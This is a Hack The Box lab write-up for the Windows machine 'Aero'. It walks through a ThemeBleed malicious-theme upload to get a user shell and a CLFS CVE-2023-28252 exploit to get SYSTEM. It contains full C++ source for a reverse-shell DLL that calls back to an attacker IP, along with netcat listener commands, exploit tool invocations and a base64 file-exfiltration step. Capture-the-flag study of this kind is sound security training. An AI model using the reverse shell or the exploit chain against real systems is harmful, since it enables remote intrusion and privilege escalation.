---
title: Aero
date: 2026-09-21
description: Medium Windows box uploading a ThemeBleed malicious theme for a sam.emerson shell, then checking hotfixes for the missing KB and running a CLFS CVE-2023-28252 exploit for SYSTEM.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Mon Sep 21 08:36:04 2026 as: /usr/lib/nmap/nmap -p80 -A -oN scan_results.txt 10.129.229.128
Nmap scan report for aero.htb (10.129.229.128)
Host is up (0.54s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Aero Theme Hub
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   849.97 ms 10.10.16.1
2   228.12 ms aero.htb (10.129.229.128)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 21 08:37:08 2026 -- 1 IP address (1 host up) scanned in 64.08 seconds
```

Port 80 hosts Aero Theme Hub — a Windows theme repo with an upload form that only accepts `.theme` / `.themepack`.

# User
## Binary Exploitation

The box is Windows, so look into **windows theme exploitation**:

> https://www.quorumcyber.com/threat-intelligence/windows-11-themebleed-remote-code-execution-vulnerability/

Which leads to an article about **RCE** known as **ThemeBleed**

---

> CVE: https://github.com/exploits-forsale/themebleed

Requirements - For traditional method (Manual):
- Windows OS as attacker system
- Visual Studio installed - to create a **malicious dll** which is gonna get us the shell

---
### Method that didn't work - Traditional method (Requires Windows OS)

Open visual studio in windows and create a new project -> Dynamic-Link Library(DLL). On Source Explorer (if not there, access it from view tab), go to Source Files -> Add -> New Item -> select C++ File(.cpp) and name the file as rev.cpp. Then on source explorer, go to Header Files -> Add -> New Item -> Select Header Files(.h) and name the file as rev.h.

In rev.h, use the code to call the function which is mentioned in the POC:

```c++
#pragma once
extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
```

In rev.cpp, use the reverse shell written in C which we got from:

> reference : https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c

Final payload:

```C++
#include "pch.h"
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
using namespace std;
void rev_shell()
{
	FreeConsole();
	const char* REMOTE_ADDR = "10.10.16.82";
	const char* REMOTE_PORT = "10001";
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo* result = NULL,
		* ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol,
		NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}
int VerifyThemeVersion(void)
{
	rev_shell();
	return 0;
}
```

Edit the **pch.h** header file by adding the rev.h header file:

```c++
// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.

#ifndef PCH_H
#define PCH_H

// add headers that you want to pre-compile here
#include "framework.h"
#include "rev.h"

#endif //PCH_H
```

Navigate to `dllmain.cpp` and compile it — once it returns zero errors, build the solution.

> **Note**: make sure the architecture is **Release**, **x64**

Now navigate to the solution `C:\Users\Dante\source\repo\Dll1\x64\Release\` and rename the **dll** as **stage_3**, then copy the stage_3 over the file stage_3 present in the **data** directory of the **ThemeBleed exploit directory**.

The exploit uses the smb server, so go to the START menu: Services -> smb server -> options -> disable.

Set a **netcat** listener for the **port** you mentioned in the reverse shell script:

```powershell
ps > ./nc.exe -lvnp 9001
```

Create a theme with the exploit with the dll:

```powershell
ps > ./themebleed.exe make_theme 10.10.16.82 aero.theme
```

Now set up a server (smb server):

```powershell
ps > ./themebleed.exe server
```

It will verbose the output `server started`.

Upload the theme on the site and the exploit will be executed.

The server runs through stage_1, stage_2, stage_3 — and when it executes stage_3, we'll gain a shell on the netcat listener.

---
### Method that worked (Windows OS not required) (Automated)

> https://github.com/jnnshschl/CVE-2023-38146

This CVE uses a python script to create a malicious dll, add it to stage_3, and create a windows theme exploit — it also uses the smb server.

```sh
python3 themebleed.py -r 10.10.16.82 -p 9001
```

Three stages execute — and when the final stage runs, we gain a shell as a user (before that, we gain the **username and NTLMv2 hash**):

```sh
rlwarp -cAr nc -lvnp 9001
```

Gained a shell `sam.emerson`

# Root

We got a file `CVE-2023-28252_Summary.pdf` in the Documents directory of the user.

We can't transfer it with `impacket-smbserver` because we're already connected using **smbserver** on `445`. We can transfer the file by encoding it in base64:

```powershell
[convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
```

Copy the output and decode it on the linux machine:

```sh
cat CVE-2023-28252_Summary.b64 | base64 -d > CVE-2023-28252_Summary.pdf
```

Now we can read the pdf:

```CVE-2023-28252_Summary
CVE-2023-28252 Summary: Vulnerability Type: Privilege Escalation Target Component: Common Log File System (CLFS) Risk Level: Critical Exploitation Date: February 2022 onwards Patch Released by Microsoft: April 2023 Background: The Nokoyawa ransomware group has been active since February 2022, and it was only in April 2023 that Microsoft released a patch to address this issue. This vulnerability has been used as a means for attackers to gain unauthorized access to Windows systems, making it imperative for us to apply the necessary patch to safeguard our infrastructure. According to Kaspersky’s analysis, the Nokoyawa ransomware group has used other exploits targeting the CLFS driver since June 2022, with similar but distinct characteristics, all linked to a single exploit developer. Actions Required: Immediate Patching: We strongly recommend applying the security patch released by Microsoft for CVE-2023-28252 as soon as possible to mitigate the risk associated with this vulnerability. Failing to do so could leave our servers exposed to potential exploitation. Review and Monitoring: In addition to patching, we should conduct a thorough review of our server logs to check for any signs of suspicious activity or unauthorized access. Continuous monitoring of our server environment is crucial to ensure the security of our systems. Security Awareness: It is essential to remind all team members of the importance of practicing good cybersecurity hygiene. Encourage the use of strong, unique passwords and two-factor authentication wherever applicable. Incident Response Plan: Ensure that our incident response plan is up-to-date and ready for immediate activation in case of any security incidents. Timely detection and response are critical in mitigating the impact of potential attacks
```

It states that the machine is vulnerable to **CVE-2023-28252** — a PrivEsc.

First check whether the vulnerability is patched:

> https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252?ref=thestack.technology

If you check just the security only, you can see the article number which is the KB number:

> `KB5025288`

```powershell
ps > systeminfo
```

In the **hotfix(s)** the **kb** number isn't present — confirmed they didn't apply the patch.

Uncompiled CVE version:
> https://github.com/fortra/CVE-2023-28252

Compiled CVE version:
> https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252

Upload the binary to the windows machine and execute it:

```powershell
ps > ./clfs_eop.exe cmd.exe
```

It'll execute the payload as **system**.

Gained `root`
